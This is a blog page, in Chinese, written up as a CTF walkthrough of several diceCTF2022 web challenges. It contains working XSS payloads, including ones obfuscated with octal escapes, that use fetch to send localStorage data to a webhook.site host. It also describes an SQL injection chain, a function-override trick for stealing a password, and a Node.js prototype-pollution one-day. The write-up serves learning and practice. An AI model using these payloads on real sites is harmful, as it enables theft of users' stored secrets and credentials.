@@ -1,0 +1,258 @@
+<!doctype html>
+<html lang="en-us"><head>
+    <title>an4er&#39; blog</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="" />
+
+    
+    
+    
+    <link rel="stylesheet" href="../../css/theme.min.css">
+
+    
+    
+    
+    <link rel="shortcut icon" href="avatar.jpg" />
+    
+</head>
+<body>
+        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
+    <div class="row">
+        
+        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
+            <a href="../../" class="text-decoration-none">
+                <img id="home-image" class="rounded-circle"
+                    
+                        
+                            src="../../avatar.jpg"
+                        
+                    
+                />
+            </a>
+        </div>
+        <div class="col-sm-8 col-12 text-sm-left text-center">
+        
+            <h2 class="m-0 mb-2 mt-4">
+                <a href="../../" class="text-decoration-none">
+                    
+                        an4er
+                    
+                </a>
+            </h2>
+            <p class="text-muted mb-1">
+                
+                    Want to be a Ctfer, Developer, Red Team
+                
+            </p>
+            <ul id="nav-links" class="list-inline mb-2">
+                
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../about/" title="About">About</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../post/" title="Posts">Posts</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../categories/" title="Categories">Categories</a>
+                    </li>
+                
+            </ul>
+            <ul id="nav-social" class="list-inline">
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://github.com/an5er" target="_blank">
+                            <i class="fab fa-github fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+    <hr />
+</header>
+<div class="container">
+    <div class="pl-sm-2">
+        <div class="mb-3">
+            <h3 class="mb-0">diceCTF2022 复现</h3>
+            
+            <small class="text-muted">Published January 31, 2023</small>
+        </div>
+
+        <article>
+            <h2 id="knock-knock">knock-knock</h2>
+<p>题目的主要逻辑是：创建一个note会返回这个note在数组中的下标<code>id</code>然后和对应的访问<code>token</code>，然后flag在程序启动的时候就push到了数组中，其下标也就是id应该为0。所以我们为了获取到flag，只要获取到对应的token即可，其中的token是如此生成的</p>
+<pre tabindex="0"><code>class Database {
+  constructor() {
+    this.notes = [];
+    this.secret = `secret-${crypto.randomUUID}`;
+  }
+  generateToken(id) {
+    return crypto
+      .createHmac(&#39;sha256&#39;, this.secret)
+      .update(id.toString())
+      .digest(&#39;hex&#39;);
+  }
+}
+</code></pre><p>所以因为我们的目的是要伪造token，所以我们需要知道它的<code>secret</code>，这里的<code>secret</code>使用模板语法，取了crypto的randomUUID值，因为没有用（）调用函数，所以返回的是函数体，也就是固定内容</p>
+<!-- raw HTML omitted -->
+<h2 id="blazingfast">blazingfast</h2>
+<p>简单读一下<code>bot.js</code>发现目的是要<code>XSS</code>，然后查看<code>index.html</code>中执行的<code>js</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">WebAssembly</span>.<span style="color:#a6e22e">instantiateStreaming</span>(<span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/blazingfast.wasm&#39;</span>)).<span style="color:#a6e22e">then</span>(({ <span style="color:#a6e22e">instance</span> }) =&gt; {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">blazingfast</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">instance</span>.<span style="color:#a6e22e">exports</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;demo-submit&#39;</span>).<span style="color:#a6e22e">onclick</span> <span style="color:#f92672">=</span> () =&gt; {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">demo</span>(document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;demo&#39;</span>).<span style="color:#a6e22e">value</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>(window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">search</span>).<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;demo&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">query</span>) {
+</span></span><span style="display:flex;"><span>		document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;demo&#39;</span>).<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">query</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">demo</span>(<span style="color:#a6e22e">query</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>})
+</span></span></code></pre></div><p>这里使用<code>js</code>的<code>api</code>去调用<code>WebAssembly</code></p>
+<blockquote>
+<p>WebAssembly 是一种新的编码方式，可以在现代的网络浏览器中运行 －  它是一种低级的类汇编语言，具有紧凑的二进制格式，可以接近原生的性能运行，并为诸如 C / C ++等语言提供一个编译目标，以便它们可以在 Web 上运行。它也被设计为可以与 JavaScript 共存，允许两者一起工作。</p>
+<p>WebAssembly 被设计为可以和 JavaScript 一起协同工作——通过使用 WebAssembly 的 JavaScript  API，你可以把 WebAssembly 模块加载到一个 JavaScript 应用中并且在两者之间共享功能。这允许你在同一个应用中利用  WebAssembly 的性能和威力以及 JavaScript 的表达力和灵活性，即使你可能并不知道如何编写 WebAssembly 代码。</p>
+</blockquote>
+<p>类似于去加载<code>/blazingfast.wasm</code>文件，然后使用在<code>.wasm</code>中定义的方法，使用<code>WebAssembly</code> 的好处是加快运行的速度，类似于汇编，相同的代码使用<code>.wasm</code>明显比使用<code>js</code>编写快。阅读上面那段代码发现有两种接收参数的方式，一种是获得<code>id</code>为<code>demo</code>内的值，也就页面中的输入框，一种是通过</p>
+<pre tabindex="0"><code>let query = new URLSearchParams(window.location.search).get(&#39;demo&#39;);
+</code></pre><p>获得<code>?demo=</code>后的值，然后一样赋值给<code>document.getElementById('demo').value</code>。然后对于输入的值作为参数传入<code>demo</code>函数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">demo</span>(<span style="color:#a6e22e">str</span>) {
+</span></span><span style="display:flex;"><span>	document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;result&#39;</span>).<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">mock</span>(<span style="color:#a6e22e">str</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>又进入<code>mock</code>函数</p>
+<p><img src="https://raw.githubusercontent.com/an5er/cloudimg/main/blog/202301131944950.png" alt="image-20230113194451902"></p>
+<p>这里的<code>blazingfast</code>是在上面利用<code>WebAssembly</code> 加载<code>/blazingfast.wasm</code>暴露实例出来的对象，也就是附件中的</p>
+<p><img src="https://raw.githubusercontent.com/an5er/cloudimg/main/blog/202301131944441.png" alt="image-20230113194412207"></p>
+<p>可以看到在mock中将用户输入的长度作为init传入，然后后面检查的长度是最初传入的长度，然后经过<code>str.toUpperCase()</code>后将结果遍历进入<code>mock</code>，这里利用一些特殊字符经过<code>toUpperCase()</code>的特性来绕过检测</p>
+<p><img src="https://raw.githubusercontent.com/an5er/cloudimg/main/blog/202301131948929.png" alt="image-20230113194835887"></p>
+<p>然后就是命令执行的问题，因为程序会将输入全转换为大写，又js是大小写敏感的语言，所以一些常见的payload无法使用，比如<code>window.open</code>要是要取得<code>localStorage.flag</code> 得通过<code>+localStorage.flag</code>但是这里就得逃出字符串的范围了，大写后无法执行，这里得用fetch，异步执行然后使用模板变量取得，这里使用<code>localStorage.flag</code>的值</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#a6e22e">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#39;&#39;[&#39;at&#39;][&#39;__proto__&#39;][&#39;constructor&#39;](&#39;fetch(`https://webhook.site/689e62cc-c516-4cec-a302-9bdc67202cc5?Q=${localStorage.flag}`)&#39;)()&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span></code></pre></div><p>因为上面说的js是大小写敏感所以直接使用会报错 <code>&quot;&quot;.AT is undefined</code>因为只有at函数没有AT函数，这里的at随便一个字符串内置的就行，目的是要拿到<code>Function</code></p>
+<p><img src="https://raw.githubusercontent.com/an5er/cloudimg/main/blog/202301132005714.png" alt="image-20230113200555660"></p>
+<p>利用字符串的特性，利用八进制绕过，脚本简单实现</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://webhook.site/689e62cc-c516-4cec-a302-9bdc67202cc5&#34;</span>
+</span></span><span style="display:flex;"><span>newstr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> str:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;[a-zA-Z]&#34;</span>,i) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>        newstr <span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>oct(ord(i))<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;o&#34;</span>)[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        newstr <span style="color:#f92672">+=</span> i
+</span></span><span style="display:flex;"><span>print(newstr)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#a6e22e">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#39;&#39;[&#39;\141\164&#39;][&#39;\137\137\160\162\157\164\157\137\137&#39;][&#39;\143\157\156\163\164\162\165\143\164\157\162&#39;](&#39;\146\145\164\143\150(`\150\164\164\160\163://\167\145\142\150\157\157\153.\163\151\164\145/689\14562\143\143-\143516-4\143\145\143-\141302-9\142\144\14367202\143\1435?Q=${\154\157\143\141\154S\164\157\162\141\147\145.\146\154\141\147}`)&#39;)()&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span></code></pre></div><p>还可以使用html编码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&#34;</span> /&gt;
+</span></span></code></pre></div><h2 id="no-cookies">no-cookies</h2>
+<p>题目逻辑是不需要cookie所有的路由都需要先登录后才可以使用，然后flag在bot的密码中，所以我们的目标是获取bot的密码</p>
+<p>在代码view.html中：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">text</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">note</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mode</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;markdown&#39;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">text</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">text</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/\[([^\]]+)\]\(([^\)]+)\)/g</span>, (<span style="color:#a6e22e">match</span>, <span style="color:#a6e22e">p1</span>, <span style="color:#a6e22e">p2</span>) =&gt; {
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> <span style="color:#e6db74">`&lt;a href=&#34;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">p2</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;&gt;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">p1</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/a&gt;`</span>;
+</span></span><span style="display:flex;"><span>        });  
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;.note&#39;</span>).<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">text</span>;
+</span></span></code></pre></div><p>可以看见在其中存在XSS，我们输入</p>
+<pre tabindex="0"><code>[a](1&#34; onfocus=alert&amp;lpar;RegExp.input&amp;rpar; autofocus=&#34;)
+拼接后成为
+&lt;a href=&#34;1&#34; onfocus=alert(RegExp.input) autofocus=&#34;&#34;&gt;a&lt;/a&gt;
+</code></pre><p>即可完成<code>XSS</code>，<code>RegExp.input</code>是看<code>wp</code>学到的可以获得上一次正则匹配成功的值，如果没有经过<code>text.replace</code>我们可以获得最后一次匹配成功的值为<code>const password = promptValid('Password:');</code>就可以获得bot的密码，但是这里只能获得note。</p>
+<p>发现note是访问/view路由的返回值，在index.js中会进行下列预编译</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">prepare</span><span style="color:#f92672">:</span> (<span style="color:#a6e22e">query</span>, <span style="color:#a6e22e">params</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">params</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> [<span style="color:#a6e22e">key</span>, <span style="color:#a6e22e">value</span>] <span style="color:#66d9ef">of</span> Object.<span style="color:#a6e22e">entries</span>(<span style="color:#a6e22e">params</span>)) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">clean</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">value</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/[&#39;$]/g</span>, <span style="color:#e6db74">&#39;&#39;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">replaceAll</span>(<span style="color:#e6db74">`:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">key</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">`&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">clean</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;`</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">query</span>;
+</span></span><span style="display:flex;"><span>},
+</span></span></code></pre></div><p>也就是可以进行sql注入</p>
+<pre tabindex="0"><code class="language-sqlite" data-lang="sqlite">// 一開始是
+INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)
+
+// 接著假設 id 是 123，就會變成
+INSERT INTO notes VALUES (&#39;123&#39; :username, :note, :mode, 0)
+
+// 再來 replace username，變成
+INSERT INTO notes VALUES (&#39;123&#39;, &#39;a :note&#39;, :note, :mode, 0)
+
+// 再來是 note，要注意的是兩個 note 都會被 replace
+INSERT INTO notes VALUES (&#39;123&#39;, &#39;a &#39;, :mode, 0, 0) -- &#39;&#39;, &#39;, :mode, 0, 0) -- &#39;, :mode, 0)
+
+// 最後是 mode，這時候我們已經可以控制 note 內容的值了，沒有任何限制
+INSERT INTO notes VALUES (&#39;123&#39;, &#39;a &#39;, &#39;payload&#39;, 0, 0) -- &#39;&#39;, &#39;, &#39;payload&#39;, 0, 0) -- &#39;, :mode, 0)
+</code></pre><p>另一种解法是</p>
+<p>利用<code>&lt;svg&gt;&lt;svg/onload=eval(name)&gt;</code>可以在下一个</p>
+<pre tabindex="0"><code>document.querySelector(&#39;.views&#39;).innerText = views;
+</code></pre><p>执行前执行代码，然后通过覆盖方法，然后使用arguments.callee.caller重新调用一次函数，然后执行的是我们覆盖完成的结果</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>document.<span style="color:#a6e22e">querySelector</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">data</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">password</span>) <span style="color:#75715e">// flag
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  };
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">arguments</span>.<span style="color:#a6e22e">callee</span>.<span style="color:#a6e22e">caller</span>()
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><blockquote>
+<p><strong>callee</strong>是arguments对象的一个属性，指向 arguments 对象的函数，即当前函数。
+<strong>caller</strong>是函数对象的一个属性，指向调用当前函数的函数体引用。</p>
+</blockquote>
+<h2 id="vm-calc">vm-calc</h2>
+<p>目的是</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">users</span>.<span style="color:#a6e22e">filter</span>(<span style="color:#a6e22e">u</span> =&gt; <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">user</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">user</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">pass</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">hash</span>)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">!==</span> <span style="color:#66d9ef">undefined</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#34;admin&#34;</span>, { <span style="color:#a6e22e">flag</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fsp</span>.<span style="color:#a6e22e">readFile</span>(<span style="color:#e6db74">&#34;flag.txt&#34;</span>) });
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>这里用到了nodejs的1day，去污染<code>Object.prototype[0]</code>，让它变为空字符串，即可绕过检查</p>
+<pre tabindex="0"><code>console.table([{x:1}], [&#34;__proto__&#34;]);
+</code></pre><p>污染的的位置在map中</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// tabularData 是第一個參數 [{x:1}]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// properties 是第二個參數 [&#34;__proto__&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">map</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ObjectCreate</span>(<span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">hasPrimitives</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">valuesKeyArray</span> <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">indexKeyArray</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ObjectKeys</span>(<span style="color:#a6e22e">tabularData</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">indexKeyArray</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">item</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tabularData</span>[<span style="color:#a6e22e">indexKeyArray</span>[<span style="color:#a6e22e">i</span>]];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">primitive</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">item</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>      (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">item</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;function&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">item</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;object&#39;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">properties</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">undefined</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">primitive</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">hasPrimitives</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">valuesKeyArray</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_inspect</span>(<span style="color:#a6e22e">item</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">keys</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">properties</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">ObjectKeys</span>(<span style="color:#a6e22e">item</span>);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// for of 的時候 key 會是 __proto__ 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">keys</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">map</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">===</span> <span style="color:#66d9ef">undefined</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">map</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>      
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// !ObjectPrototypeHasOwnProperty(item, key) 會成立
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span> ((<span style="color:#a6e22e">primitive</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">properties</span>) <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>           <span style="color:#f92672">!</span><span style="color:#a6e22e">ObjectPrototypeHasOwnProperty</span>(<span style="color:#a6e22e">item</span>, <span style="color:#a6e22e">key</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 因此 map[__proto__][0] 會是空字串
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">map</span>[<span style="color:#a6e22e">key</span>][<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">map</span>[<span style="color:#a6e22e">key</span>][<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_inspect</span>(<span style="color:#a6e22e">item</span>[<span style="color:#a6e22e">key</span>]);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="dicevault">dicevault</h2>
+<p><a href="https://hackmd.io/fmdfFQ2iS6yoVpbR3KCiqQ#webdicevault">https://hackmd.io/fmdfFQ2iS6yoVpbR3KCiqQ#webdicevault</a></p>
+
+        </article>
+    </div>
+
+    
+
+            </div>
+        </div><footer class="text-center pb-1">
+</footer>
+</body>
+</html>
